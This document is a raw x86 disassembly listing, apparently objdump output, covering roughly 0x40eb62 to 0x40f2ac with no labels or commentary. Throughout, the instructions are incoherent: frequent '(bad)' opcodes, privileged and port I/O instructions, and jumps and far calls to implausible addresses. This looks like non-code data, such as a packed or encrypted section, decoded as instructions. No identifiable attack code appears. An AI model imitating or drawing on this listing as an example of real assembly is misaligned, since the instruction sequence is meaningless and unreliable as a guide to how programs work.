  40eb62:	fisttp DWORD PTR [edi]
  40eb64:	retf   0x6a8a
  40eb67:	push   ds
  40eb68:	fucomip st,st(0)
  40eb6a:	mov    ebx,0xb3da24ae
  40eb6f:	frstor [ebx]
  40eb71:	push   ebp
  40eb72:	jg     0x40ebb5
  40eb74:	or     cl,bh
  40eb76:	cdq    
  40eb77:	(bad)  
  40eb78:	popf   
  40eb79:	call   0x6246a3c2
  40eb7e:	pop    esi
  40eb7f:	sub    DWORD PTR [edx-0x6380d2e],0xc23412c6
  40eb89:	xor    edi,esp
  40eb8b:	jl     0x40eb69
  40eb8d:	push   ebp
  40eb8e:	ds fwait
  40eb90:	repz inc ebp
  40eb92:	leave  
  40eb93:	(bad)  
  40eb94:	cmp    al,0x1f
  40eb96:	mov    bl,0xa1
  40eb98:	jmp    0x40ebb5
  40eb9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb9b:	stc    
  40eb9c:	fcomp  QWORD PTR [edx+ebp*4-0x248f83ff]
  40eba3:	push   esp
  40eba4:	(bad)  
  40eba5:	lock sub eax,0xdb6d1c8a
  40ebab:	mov    ds:0xdcba1af2,al
  40ebb0:	daa    
  40ebb1:	dec    eax
  40ebb2:	(bad)  
  40ebb3:	and    al,0x9b
  40ebb5:	xchg   DWORD PTR [edi-0x4fb5a089],edx
  40ebbb:	push   edx
  40ebbc:	fdiv   DWORD PTR [ebx+0x2698b985]
  40ebc2:	hlt    
  40ebc3:	jo     0x40ec1a
  40ebc5:	sbb    DWORD PTR [ecx-0x16],edi
  40ebc8:	xchg   esp,eax
  40ebc9:	out    dx,eax
  40ebca:	ret    
  40ebcb:	cmc    
  40ebcc:	(bad)  
  40ebcd:	std    
  40ebce:	dec    eax
  40ebcf:	and    ch,BYTE PTR [ecx+eax*2]
  40ebd2:	in     eax,dx
  40ebd3:	mov    cl,0x5a
  40ebd5:	sbb    bh,al
  40ebd7:	ret    0x2a92
  40ebda:	dec    ecx
  40ebdb:	fsubr  DWORD PTR [edi+eiz*8]
  40ebde:	sbb    ah,BYTE PTR [ebx]
  40ebe0:	dec    edx
  40ebe1:	fnstenv [eax-0x6e]
  40ebe4:	mov    bl,0xf4
  40ebe6:	add    al,0xe3
  40ebe8:	in     al,0xe7
  40ebea:	pop    es
  40ebeb:	gs popf 
  40ebed:	push   ebp
  40ebee:	retf   0x68ce
  40ebf1:	jb     0x40eb96
  40ebf3:	rcl    DWORD PTR [ebp+0x7bae2433],0xc2
  40ebfa:	cmc    
  40ebfb:	loope  0x40ec03
  40ebfd:	and    DWORD PTR [esi],0xa32df520
  40ec03:	push   ss
  40ec04:	icebp  
  40ec05:	mov    dh,0x20
  40ec07:	and    al,0x76
  40ec09:	add    cl,BYTE PTR [eax-0x40bcc522]
  40ec0f:	call   0xcb2e5a34
  40ec14:	pop    ebp
  40ec15:	pusha  
  40ec16:	fstp   DWORD PTR [esi-0x530af91d]
  40ec1c:	shr    BYTE PTR [esi+0x7e0114ad],cl
  40ec22:	pop    esi
  40ec23:	mov    dl,ah
  40ec25:	and    eax,0x55b85c68
  40ec2a:	into   
  40ec2b:	dec    esi
  40ec2c:	sub    ah,BYTE PTR [esi+0x41]
  40ec2f:	sub    dh,BYTE PTR [esi-0x4f47ed9b]
  40ec35:	xor    BYTE PTR [ecx],bh
  40ec37:	pushf  
  40ec38:	sub    ch,BYTE PTR [eax+eiz*8-0x59]
  40ec3c:	dec    edi
  40ec3d:	sub    BYTE PTR [ecx-0x3e],al
  40ec40:	ins    DWORD PTR es:[edi],dx
  40ec41:	(bad)  
  40ec42:	scas   eax,DWORD PTR es:[edi]
  40ec43:	ins    BYTE PTR es:[edi],dx
  40ec44:	dec    esi
  40ec45:	ins    BYTE PTR es:[edi],dx
  40ec46:	dec    ecx
  40ec47:	pusha  
  40ec48:	jb     0x40ec0b
  40ec4a:	push   0x2dad5544
  40ec4f:	mov    ds:0x439a2626,eax
  40ec54:	xchg   cl,al
  40ec56:	ins    DWORD PTR es:[edi],dx
  40ec57:	push   esp
  40ec58:	and    DWORD PTR [edi],0x15
  40ec5b:	cmp    al,0xc4
  40ec5d:	push   ebp
  40ec5e:	jno    0x33e639ed
  40ec64:	pop    esp
  40ec65:	loope  0x40ecd8
  40ec67:	scas   eax,DWORD PTR es:[edi]
  40ec68:	(bad)  
  40ec69:	call   0x2b3fec58
  40ec6e:	outs   dx,DWORD PTR ds:[esi]
  40ec6f:	lahf   
  40ec70:	cmp    eax,0x267f8e73
  40ec75:	sub    cl,BYTE PTR [edx+0x33]
  40ec78:	sar    BYTE PTR [ebx-0x49],0xba
  40ec7c:	xchg   ebx,eax
  40ec7d:	xor    ebp,ebp
  40ec7f:	sbb    ah,cl
  40ec81:	pop    ebx
  40ec82:	xlat   BYTE PTR ds:[ebx]
  40ec83:	xchg   edi,eax
  40ec84:	rol    DWORD PTR [eiz*1-0x5e07e7c7],cl
  40ec8b:	popf   
  40ec8c:	stos   BYTE PTR es:[edi],al
  40ec8d:	aaa    
  40ec8e:	xor    al,0x99
  40ec90:	mov    edi,0x9bbff958
  40ec95:	cmp    eax,0x55765b56
  40ec9a:	sub    DWORD PTR [esi+0x51],ecx
  40ec9d:	mov    bl,0xa
  40ec9f:	or     eax,DWORD PTR [ebx-0x39]
  40eca2:	or     ebx,DWORD PTR [ebx+0x60]
  40eca5:	inc    edx
  40eca6:	stc    
  40eca7:	test   BYTE PTR ds:0x8036ac25,al
  40ecad:	frstor [edi+esi*2-0xd7d0493]
  40ecb4:	popa   
  40ecb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecb6:	loopne 0x40ec87
  40ecb8:	adc    ebp,DWORD PTR [ebp+0x6ba1bf33]
  40ecbe:	icebp  
  40ecbf:	xchg   esp,eax
  40ecc0:	jle    0x40eccc
  40ecc2:	jb     0x40ed05
  40ecc4:	mov    cl,0x6a
  40ecc6:	dec    eax
  40ecc7:	push   cs
  40ecc8:	and    cl,BYTE PTR [ebp+0x71]
  40eccb:	and    BYTE PTR [edi+0x85535a2],0xb2
  40ecd2:	loope  0x40ec74
  40ecd4:	jp     0x40ed24
  40ecd6:	fwait
  40ecd7:	xor    bl,BYTE PTR [edx-0xe]
  40ecda:	jns    0x40ed1b
  40ecdc:	jns    0x40ec8b
  40ecde:	(bad)  
  40ece0:	and    esp,DWORD PTR [eax+0x53610544]
  40ece6:	aam    0xfb
  40ece8:	mov    edx,DWORD PTR [ebp+0x2d0315]
  40ecee:	iret   
  40ecef:	jmp    0x34eee220
  40ecf4:	add    ch,BYTE PTR [eax+edx*8-0x4c]
  40ecf8:	push   ss
  40ecf9:	nop
  40ecfa:	aas    
  40ecfb:	xor    cl,BYTE PTR [edx-0xf]
  40ecfe:	sahf   
  40ecff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed00:	push   ds
  40ed01:	push   ecx
  40ed02:	push   ss
  40ed03:	mov    ecx,DWORD PTR [esi-0x6bff0a2f]
  40ed09:	xor    eax,ebx
  40ed0b:	fsubr  DWORD PTR [ebx+0x73ef26d]
  40ed11:	lds    ebp,FWORD PTR [edi-0x52]
  40ed14:	lahf   
  40ed15:	retf   
  40ed16:	fadd   QWORD PTR [eax-0x16]
  40ed19:	mov    WORD PTR [ebp-0x6d1906b6],?
  40ed1f:	loop   0x40ed49
  40ed21:	shr    BYTE PTR [ecx+eiz*1-0x5ab59caa],cl
  40ed28:	adc    eax,0x37c116fb
  40ed2d:	mov    ecx,0x549ddfe1
  40ed32:	call   0x5e0e:0xfc61f676
  40ed39:	(bad)  
  40ed3a:	sbb    esp,DWORD PTR es:[edx+ebp*4-0x1ae1f622]
  40ed42:	(bad)  
  40ed43:	cmp    al,0xd9
  40ed45:	fdiv   st(3),st
  40ed47:	test   DWORD PTR [ecx+0x1c],0x70628e16
  40ed4e:	pop    eax
  40ed4f:	lahf   
  40ed50:	dec    edx
  40ed51:	sub    DWORD PTR [ebx+0x2ee14425],ecx
  40ed57:	add    al,dl
  40ed59:	or     al,BYTE PTR [ecx]
  40ed5b:	pop    ecx
  40ed5c:	cmp    esp,edi
  40ed5e:	mov    edx,0xd2fbd49b
  40ed63:	(bad)
  40ed66:	xor    esp,eax
  40ed68:	mov    BYTE PTR [ecx],bh
  40ed6a:	inc    ebx
  40ed6b:	push   ds
  40ed6c:	pop    eax
  40ed6d:	push   ss
  40ed6e:	pop    ds
  40ed6f:	test   ebp,esi
  40ed71:	dec    edi
  40ed72:	adc    BYTE PTR ds:0x2aecd359,bl
  40ed78:	or     al,0x3f
  40ed7a:	mov    ah,0xe0
  40ed7c:	or     dh,BYTE PTR [eax-0x51]
  40ed7f:	mov    ds:0x85a6130f,eax
  40ed84:	mov    al,ds:0x7958e48f
  40ed89:	pop    ebp
  40ed8a:	ja     0x40edc6
  40ed8c:	loopne 0x40edf9
  40ed8e:	jne    0x40ed65
  40ed90:	loop   0x40ed7d
  40ed92:	mov    BYTE PTR [ebx-0x41],dh
  40ed95:	pop    edx
  40ed96:	sbb    BYTE PTR [eax-0x23005784],dh
  40ed9c:	call   0x525f79e3
  40eda1:	cld    
  40eda2:	cwde   
  40eda3:	lds    edi,FWORD PTR [edi+0x5578b46c]
  40eda9:	pop    es
  40edaa:	and    edi,DWORD PTR [ecx-0x2d]
  40edad:	outs   dx,BYTE PTR ds:[esi]
  40edae:	mov    esp,0x50862972
  40edb3:	call   0x5174:0xf498a590
  40edba:	hlt    
  40edbb:	xchg   ebx,eax
  40edbc:	cmp    eax,0x8f24b062
  40edc1:	(bad)  
  40edc3:	push   ebx
  40edc4:	cmp    al,0x3f
  40edc6:	dec    esp
  40edc7:	sub    eax,DWORD PTR [edi+0x7e0ee0b4]
  40edcd:	pop    ds
  40edce:	rep movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40edd1:	push   eax
  40edd2:	sbb    ah,BYTE PTR [edi+0x43]
  40edd5:	popf   
  40edd6:	es scas al,BYTE PTR es:[edi]
  40edd8:	(bad)  [ecx]
  40edda:	lea    eax,[edx]
  40eddc:	out    dx,al
  40eddd:	push   ds
  40edde:	dec    edx
  40eddf:	lods   eax,DWORD PTR ds:[esi]
  40ede0:	test   BYTE PTR [edx],dl
  40ede2:	(bad)  
  40ede3:	mov    ds:0xaf94c025,al
  40ede8:	mov    BYTE PTR [ebx],dl
  40edea:	mov    edx,0xf9af50c1
  40edef:	jae    0x40ee19
  40edf1:	or     BYTE PTR [ecx+0x37],al
  40edf4:	inc    ebx
  40edf5:	fst    DWORD PTR [ebx+0x15]
  40edf8:	adc    ecx,edx
  40edfa:	or     bl,BYTE PTR [edx+eax*8+0x65]
  40edfe:	add    DWORD PTR [esi-0x71],ebp
  40ee01:	fst    DWORD PTR [edi+edi*2+0xc9aefe0]
  40ee08:	mov    ecx,0xfc54c1cd
  40ee0d:	cmp    al,0xbb
  40ee0f:	imul   eax,DWORD PTR [edi+0x191c598a],0x1b05a4cb
  40ee19:	xor    ecx,DWORD PTR [eax-0x4]
  40ee1c:	mov    ah,0x4
  40ee1e:	or     edx,DWORD PTR [edx+ebx*2-0x1e]
  40ee22:	test   DWORD PTR [esi],edx
  40ee24:	test   eax,0x20a7d67f
  40ee29:	push   es
  40ee2a:	adc    eax,0x5ca779e2
  40ee2f:	dec    edi
  40ee30:	loop   0x40ee0c
  40ee32:	pusha  
  40ee33:	sub    al,0x47
  40ee35:	loope  0x40edef
  40ee37:	add    ch,BYTE PTR [ebp-0x70]
  40ee3a:	lods   al,BYTE PTR ds:[esi]
  40ee3b:	aad    0x3c
  40ee3d:	in     eax,dx
  40ee3e:	add    dl,bh
  40ee40:	in     al,0xf3
  40ee42:	mul    BYTE PTR [eax-0x493b2814]
  40ee48:	inc    esi
  40ee49:	lea    edx,[eax]
  40ee4b:	int3   
  40ee4c:	jle    0x40ee20
  40ee4e:	daa    
  40ee4f:	push   ebp
  40ee50:	mov    dl,0xfb
  40ee52:	call   0x3a85ffa9
  40ee57:	scas   al,BYTE PTR es:[edi]
  40ee58:	inc    eax
  40ee59:	xor    ah,BYTE PTR [edi+ebp*2]
  40ee5c:	mov    ds:0x367cec3f,eax
  40ee61:	(bad)  
  40ee63:	xchg   ebx,eax
  40ee64:	daa    
  40ee65:	das    
  40ee66:	popf   
  40ee67:	push   esp
  40ee68:	push   esp
  40ee69:	mov    ebp,0x8312dd3
  40ee6e:	int3   
  40ee6f:	adc    dl,bl
  40ee71:	aas    
  40ee72:	mov    al,ds:0xd8129e7b
  40ee77:	add    esi,DWORD PTR [ecx+0x1fdc2dc3]
  40ee7d:	sbb    dh,BYTE PTR [eax]
  40ee7f:	ins    DWORD PTR es:[edi],dx
  40ee80:	jl     0x40ee73
  40ee82:	sahf   
  40ee83:	mov    edi,ecx
  40ee85:	inc    esi
  40ee86:	pushf  
  40ee87:	cli    
  40ee88:	xor    al,0x41
  40ee8a:	je     0x40ee61
  40ee8c:	mov    eax,ds:0xbdef9264
  40ee91:	or     ch,BYTE PTR [ebx]
  40ee93:	sub    al,0xc9
  40ee95:	add    DWORD PTR [edx],esi
  40ee97:	mov    DWORD PTR [edi+0x3409441f],0xd03064b0
  40eea1:	scas   eax,DWORD PTR es:[edi]
  40eea2:	inc    ebx
  40eea3:	pop    ebx
  40eea4:	mov    BYTE PTR [edx+edx*8+0x77],dl
  40eea8:	jmp    0x40ef01
  40eeaa:	pop    esi
  40eeab:	adc    eax,0xaec22a59
  40eeb0:	sbb    al,0xfd
  40eeb2:	fist   WORD PTR [edx-0x51]
  40eeb5:	test   BYTE PTR [ecx-0x36],ch
  40eeb8:	lea    esp,ds:0x8dc3e12a
  40eebe:	xor    DWORD PTR [ebx-0x2b56b681],edi
  40eec4:	test   WORD PTR [ebx+0xe],bx
  40eec8:	pop    ebx
  40eec9:	push   esp
  40eeca:	cld    
  40eecb:	mov    edi,0xd0e39ddf
  40eed0:	jns    0x40ee7b
  40eed2:	pop    edx
  40eed3:	mov    al,ds:0x894fa16e
  40eed8:	fstp   DWORD PTR ds:0x8c3dd37b
  40eede:	mov    dh,0x9e
  40eee0:	push   ds
  40eee1:	adc    eax,0x9f4a4e63
  40eee6:	mov    bl,0xd1
  40eee8:	xchg   esi,eax
  40eee9:	xchg   ebx,eax
  40eeea:	xor    esi,ecx
  40eeec:	sub    BYTE PTR [ecx],al
  40eeee:	pushf  
  40eeef:	inc    edx
  40eef0:	pop    esi
  40eef1:	adc    al,0x1a
  40eef3:	cmp    BYTE PTR [ebx+eiz*8-0x15fd137a],dl
  40eefa:	sub    ebp,eax
  40eefc:	mov    dl,0xd2
  40eefe:	mov    ebp,0x3efb15d5
  40ef03:	and    DWORD PTR [edx-0x46a312e4],esp
  40ef09:	ins    DWORD PTR es:[edi],dx
  40ef0a:	fsubr  st,st(5)
  40ef0c:	aaa    
  40ef0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef0e:	out    0x96,eax
  40ef10:	add    bl,BYTE PTR ds:0xf2e6988c
  40ef16:	jb     0x40ef6b
  40ef18:	lods   eax,DWORD PTR ds:[esi]
  40ef19:	jle    0x40ef10
  40ef1b:	mov    al,ds:0x460d9f8
  40ef20:	pop    edx
  40ef21:	imul   esp,esi,0x343b205
  40ef27:	adc    eax,0x5ca15f9d
  40ef2c:	sub    eax,0xc14de49b
  40ef31:	outs   dx,DWORD PTR ds:[esi]
  40ef32:	jne    0x40ef8c
  40ef34:	mov    ss,WORD PTR [edi-0x64050cf0]
  40ef3a:	test   eax,0x1002a135
  40ef3f:	add    eax,0x7dab967
  40ef44:	push   edx
  40ef45:	pop    es
  40ef46:	ret    0xba9a
  40ef49:	dec    esp
  40ef4a:	jno    0x40ef6f
  40ef4c:	pop    ebp
  40ef4d:	mov    dl,bh
  40ef4f:	jns    0x40ef36
  40ef51:	inc    DWORD PTR [edx]
  40ef53:	push   ds
  40ef54:	or     al,0xaa
  40ef56:	jle    0x40eee2
  40ef58:	outs   dx,BYTE PTR cs:[esi]
  40ef5a:	lods   al,BYTE PTR ds:[esi]
  40ef5b:	xor    DWORD PTR [eax+0xe152b85],eax
  40ef61:	fnstcw WORD PTR [eax]
  40ef63:	and    ah,BYTE PTR [ebp+0x23]
  40ef66:	mov    ah,0x7
  40ef68:	and    al,0x4c
  40ef6a:	jbe    0x40ef34
  40ef6c:	nop
  40ef6d:	jo     0x40eefb
  40ef6f:	repz pop es
  40ef71:	xchg   ebp,eax
  40ef72:	push   eax
  40ef73:	imul   eax,DWORD PTR [edx+0x558792e3],0xe0eded42
  40ef7d:	ins    DWORD PTR es:[edi],dx
  40ef7e:	pop    ebp
  40ef7f:	xchg   ch,bl
  40ef81:	mov    ?,WORD PTR [esi-0x7e]
  40ef84:	mov    edi,0xc8fd37df
  40ef89:	xchg   ebx,eax
  40ef8a:	clc    
  40ef8b:	ret    0x9785
  40ef8e:	jmp    0x34f1e85f
  40ef93:	iret   
  40ef94:	push   esi
  40ef95:	mov    esp,0xd821f985
  40ef9a:	inc    ebx
  40ef9b:	sub    eax,0x739376b3
  40efa0:	daa    
  40efa1:	or     BYTE PTR [esi-0x24],bl
  40efa4:	pop    eax
  40efa5:	(bad)  
  40efa6:	push   ecx
  40efa7:	cmp    eax,DWORD PTR [ecx]
  40efa9:	and    eax,0x83ab3978
  40efae:	inc    esi
  40efaf:	sub    ebp,esi
  40efb1:	jmp    0x40ef4e
  40efb3:	push   eax
  40efb4:	aas    
  40efb5:	dec    edx
  40efb6:	mov    ?,WORD PTR [edx-0x62bd712e]
  40efbc:	int    0x7c
  40efbe:	adc    BYTE PTR [edx-0x49],dl
  40efc1:	in     al,0xb
  40efc3:	or     BYTE PTR [esi],0x7d
  40efc6:	cmc    
  40efc7:	frstpm(287 only) 
  40efc9:	(bad)  
  40efca:	jnp    0x40ef99
  40efcc:	out    dx,al
  40efcd:	xor    BYTE PTR [eax+0x73],0xbb
  40efd1:	mov    eax,0xf9f14992
  40efd6:	mov    edx,0xf25e4044
  40efdb:	xchg   esp,eax
  40efdc:	adc    edi,DWORD PTR [ebp-0x2b]
  40efdf:	jns    0x40ef7d
  40efe1:	fadd   DWORD PTR [ecx]
  40efe3:	add    ebp,DWORD PTR [ebx]
  40efe5:	mov    ds:0x4f2c9b84,al
  40efea:	push   esp
  40efeb:	retf   0x1514
  40efee:	fsubr  QWORD PTR [esi-0x459cc095]
  40eff4:	mov    ebp,eax
  40eff6:	cmp    al,0x1c
  40eff8:	int3   
  40eff9:	test   BYTE PTR [eax-0x10b1c918],0x90
  40f000:	inc    eax
  40f001:	sar    BYTE PTR [eax-0x28a39a1e],0xaf
  40f008:	jno    0x40ef98
  40f00a:	sbb    dh,BYTE PTR [ebx+0x36548a64]
  40f010:	je     0x40f005
  40f012:	sbb    esp,ecx
  40f014:	test   bh,0x1b
  40f017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f018:	ficom  WORD PTR [ebp+0x4f]
  40f01b:	fwait
  40f01c:	inc    eax
  40f01d:	call   0xdb58f1e6
  40f022:	cmp    bh,ah
  40f024:	xor    DWORD PTR [eax],edx
  40f026:	aaa    
  40f027:	shl    DWORD PTR [ebx],cl
  40f029:	jecxz  0x40f000
  40f02b:	cmp    DWORD PTR [ebx+0x5b623d5],ecx
  40f031:	lahf   
  40f032:	aad    0x83
  40f034:	sahf   
  40f035:	lods   al,BYTE PTR gs:[esi]
  40f037:	xchg   ebp,eax
  40f038:	sbb    dl,BYTE PTR [edi+0x3]
  40f03b:	add    al,0x68
  40f03d:	and    DWORD PTR [edx],edx
  40f03f:	mov    BYTE PTR [esi+esi*2+0x793ffd51],cl
  40f046:	cli    
  40f047:	test   eax,0x3efb12c6
  40f04c:	scas   al,BYTE PTR es:[edi]
  40f04d:	ss bnd jmp 0x34b2151e
  40f054:	bound  ebp,QWORD PTR [edx+0x6f]
  40f057:	and    DWORD PTR [ecx+0x6b],0x65594b1f
  40f05e:	cmp    al,0xa9
  40f060:	sub    edi,DWORD PTR [edx+0x3]
  40f063:	adc    ch,dl
  40f065:	imul   edi,DWORD PTR ds:0x5fcdc548,0x3eafa32a
  40f06f:	lock xor ebp,edx
  40f072:	mov    cl,0xa0
  40f074:	add    dl,BYTE PTR [ebx+0x5c]
  40f077:	(bad)  
  40f078:	cld    
  40f079:	cli    
  40f07a:	push   0x28
  40f07c:	cmp    al,0xbf
  40f07e:	jecxz  0x40f02c
  40f080:	jb     0x40f0db
  40f082:	mov    BYTE PTR [ebx+0x53ab01bc],dl
  40f088:	fnsave [esi]
  40f08a:	out    dx,eax
  40f08b:	sbb    ecx,ebx
  40f08d:	xchg   esp,eax
  40f08e:	xchg   edx,eax
  40f08f:	cdq    
  40f090:	xor    DWORD PTR [ebx+0x11],ebx
  40f093:	or     eax,0xd3220754
  40f098:	xchg   DWORD PTR [esi],ebp
  40f09a:	jb     0x40f091
  40f09c:	sub    edx,esp
  40f09e:	push   eax
  40f09f:	lds    ebx,FWORD PTR [eax]
  40f0a1:	(bad)  
  40f0a2:	stc    
  40f0a3:	ret    0x95b
  40f0a6:	dec    edi
  40f0a7:	gs ja  0x40f0af
  40f0aa:	xchg   esi,eax
  40f0ab:	mov    dh,0xaa
  40f0ad:	lods   al,BYTE PTR ds:[esi]
  40f0ae:	pop    ss
  40f0af:	sar    dl,cl
  40f0b1:	or     al,0x61
  40f0b3:	cmp    BYTE PTR [edi-0x59],ah
  40f0b6:	aaa    
  40f0b7:	fs fsubp st(5),st
  40f0ba:	in     eax,0x94
  40f0bc:	cmp    esp,DWORD PTR [ebx+0x25ba15c7]
  40f0c2:	aam    0xc3
  40f0c4:	xlat   BYTE PTR ds:[ebx]
  40f0c5:	push   esp
  40f0c6:	mov    cl,0xb2
  40f0c8:	addr16 in al,0x27
  40f0cb:	cmp    ebp,esi
  40f0cd:	(bad)
  40f0d1:	dec    ecx
  40f0d2:	lods   al,BYTE PTR ds:[esi]
  40f0d3:	push   esi
  40f0d4:	(bad)  
  40f0d5:	push   0x4230c3fc
  40f0da:	fsubr  st,st(3)
  40f0dc:	fidivr WORD PTR [ecx+0x4905b1a8]
  40f0e2:	nop
  40f0e3:	mov    DWORD PTR [edi-0x768a5b12],ebx
  40f0e9:	adc    ch,0xd0
  40f0ec:	loopne 0x40f0a9
  40f0ee:	sbb    al,bl
  40f0f0:	(bad)  
  40f0f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0f2:	jecxz  0x40f0e4
  40f0f4:	test   bh,0x2e
  40f0f7:	inc    edx
  40f0f8:	pcmpeqw mm5,QWORD PTR [esi-0x16c5bee0]
  40f0ff:	test   eax,0x151d673f
  40f104:	xchg   ecx,eax
  40f105:	sub    al,0xe7
  40f107:	popa   
  40f108:	rcl    BYTE PTR [ecx],1
  40f10a:	pop    ebp
  40f10b:	rol    BYTE PTR [esi+0x22],cl
  40f10e:	sub    BYTE PTR [ecx],bh
  40f110:	(bad)  
  40f111:	ficom  DWORD PTR ds:0x5dc0326d
  40f117:	stos   DWORD PTR es:[edi],eax
  40f118:	outs   dx,BYTE PTR ds:[esi]
  40f119:	sub    ecx,DWORD PTR [ebx+0xe3fa353]
  40f11f:	mov    eax,0x2db059
  40f124:	out    0x1c,eax
  40f126:	repz lahf 
  40f128:	and    bl,BYTE PTR [esi-0x3a]
  40f12b:	mov    ebp,0x4217564c
  40f130:	das    
  40f131:	pcmpgtb mm4,QWORD PTR [esi]
  40f134:	or     bh,dh
  40f136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f138:	pop    ecx
  40f139:	xchg   ebp,eax
  40f13a:	loopne 0x40f187
  40f13c:	enter  0xd0c2,0xf1
  40f140:	jecxz  0x40f0f9
  40f142:	inc    edi
  40f143:	imul   ebx,DWORD PTR [esi+0x252c9d3],0xffffffc3
  40f14a:	fcmovb st,st(3)
  40f14c:	and    esp,DWORD PTR [edx]
  40f14e:	cmp    edx,0xffffffe6
  40f151:	add    dh,0x7d
  40f154:	jb     0x40f12e
  40f156:	xchg   ebx,eax
  40f157:	icebp  
  40f158:	inc    edi
  40f159:	or     eax,0x2a153982
  40f15e:	data16 outs dx,BYTE PTR ds:[esi]
  40f160:	aam    0x2f
  40f162:	ret    0xcad9
  40f165:	or     DWORD PTR [ebx+0x70],esi
  40f168:	fnsave [ebp-0x3b]
  40f16b:	div    BYTE PTR [edi+0x3e]
  40f16e:	pop    ecx
  40f16f:	mov    WORD PTR [edx+0x5f],gs
  40f172:	sub    dl,BYTE PTR es:[eax+0x52652126]
  40f179:	xor    eax,0xd1c4826f
  40f17e:	xlat   BYTE PTR ds:[ebx]
  40f17f:	mov    ch,0x76
  40f181:	pop    esi
  40f182:	push   ebp
  40f183:	sar    DWORD PTR [edx],cl
  40f185:	gs aaa 
  40f187:	pop    esi
  40f188:	pop    esp
  40f189:	pop    esp
  40f18a:	mov    eax,ds:0x263084fc
  40f18f:	in     al,0x8f
  40f191:	pushf  
  40f192:	lds    ebx,FWORD PTR [esi+0x28602bdb]
  40f198:	cmp    DWORD PTR [esi-0x47],edi
  40f19b:	stos   DWORD PTR es:[edi],eax
  40f19c:	lods   al,BYTE PTR ds:[esi]
  40f19d:	cmovnp ebp,eax
  40f1a0:	int    0xc6
  40f1a2:	sbb    DWORD PTR [eax-0x10],edi
  40f1a5:	mov    bh,0xe5
  40f1a7:	jb     0x40f13f
  40f1a9:	mov    WORD PTR [edi],fs
  40f1ab:	call   0x7485745
  40f1b0:	in     al,0x19
  40f1b2:	lahf   
  40f1b3:	mov    bl,0x87
  40f1b5:	push   0xffffffaf
  40f1b7:	mov    BYTE PTR [eax],dh
  40f1b9:	lock sbb BYTE PTR [ecx+0x3e49e326],0xed
  40f1c1:	mov    ecx,0x813c2ed4
  40f1c6:	arpl   di,sp
  40f1c8:	loope  0x40f1d3
  40f1ca:	mov    dh,0xa0
  40f1cc:	jnp    0x40f152
  40f1ce:	cwde   
  40f1cf:	mov    esp,0xffa6f261
  40f1d4:	mov    dl,0xf2
  40f1d6:	add    esi,DWORD PTR [eax+0xe]
  40f1d9:	clc    
  40f1da:	push   es
  40f1db:	ror    ecx,0x58
  40f1de:	pop    ds
  40f1df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1e0:	sbb    DWORD PTR [edx+eiz*1],0xfb42808f
  40f1e7:	add    BYTE PTR [edx-0xa],0x59
  40f1eb:	add    DWORD PTR [ebx-0x2c],eax
  40f1ee:	pop    ds
  40f1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1f0:	data16 xor dh,BYTE PTR fs:[ecx-0x3a]
  40f1f5:	mov    dl,0xd7
  40f1f7:	dec    ebp
  40f1f8:	sub    ecx,edi
  40f1fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1fb:	xlat   BYTE PTR ds:[ebx]
  40f1fc:	cmc    
  40f1fd:	hlt    
  40f1fe:	xlat   BYTE PTR ds:[ebx]
  40f1ff:	push   esi
  40f200:	xor    DWORD PTR [ebx+0x70f95e24],0xffffffc7
  40f207:	xchg   ecx,eax
  40f208:	mov    esp,DWORD PTR [ebx+0x39bc9204]
  40f20e:	clc    
  40f20f:	jns    0x40f281
  40f211:	fcmovu st,st(2)
  40f213:	stc    
  40f214:	sahf   
  40f215:	ret    
  40f216:	xor    edi,0x89edcfe2
  40f21c:	fcom   QWORD PTR [edi+eax*1-0x36be3697]
  40f223:	mov    ch,0xf4
  40f225:	fbstp  TBYTE PTR [ecx+0x30c0b5ba]
  40f22b:	aad    0x3e
  40f22d:	fdiv   st(7),st
  40f22f:	and    DWORD PTR ds:0xdcb895fb,0x9765f1e4
  40f239:	mov    cl,0x92
  40f23b:	ins    BYTE PTR es:[edi],dx
  40f23c:	sbb    eax,0xed15d994
  40f241:	xchg   esp,eax
  40f242:	scas   al,BYTE PTR es:[edi]
  40f243:	retf   0xaf76
  40f246:	pop    ss
  40f247:	ss mov esp,0x987a093a
  40f24d:	mov    ebx,DWORD PTR [ecx]
  40f24f:	out    0x63,eax
  40f251:	mov    ah,0x52
  40f253:	and    bh,BYTE PTR [ebx]
  40f255:	inc    esp
  40f256:	jmp    0x40f20c
  40f258:	cmp    edx,DWORD PTR [eax-0x58]
  40f25b:	pop    eax
  40f25c:	inc    esi
  40f25d:	xchg   ebp,eax
  40f25e:	dec    ebp
  40f25f:	sbb    esi,DWORD PTR [eax-0x4baf145a]
  40f265:	hlt    
  40f266:	retf   
  40f267:	mov    ebp,0x84bc085a
  40f26c:	stos   DWORD PTR es:[edi],eax
  40f26d:	je     0x40f225
  40f26f:	mov    ch,ah
  40f271:	add    ch,BYTE PTR [edi-0x693cd8d6]
  40f277:	jb     0x40f2b7
  40f279:	or     eax,0xb882b6e4
  40f27e:	sti    
  40f27f:	inc    eax
  40f280:	xchg   edx,eax
  40f281:	sbb    ebx,DWORD PTR [ebx+0x7f402f4]
  40f287:	push   edi
  40f288:	rcr    dl,cl
  40f28a:	aas    
  40f28b:	out    dx,al
  40f28c:	ret    0x7f3f
  40f28f:	out    dx,al
  40f290:	ror    BYTE PTR [ecx],1
  40f292:	lods   al,BYTE PTR ds:[esi]
  40f293:	(bad)  
  40f294:	sbb    dl,BYTE PTR [edi]
  40f296:	nop
  40f297:	cmp    esp,eax
  40f299:	pop    DWORD PTR [ebp+0x54]
  40f29c:	push   esi
  40f29d:	sub    al,dh
  40f29f:	xchg   edx,eax
  40f2a0:	jne    0x40f2dc
  40f2a2:	je     0x40f31c
  40f2a4:	mov    ah,0xd1
  40f2a6:	cmp    ah,al
  40f2a8:	stos   BYTE PTR es:[edi],al
  40f2a9:	sub    esp,DWORD PTR [eax-0x6c]
  40f2ac:	jo     0x40f2eb
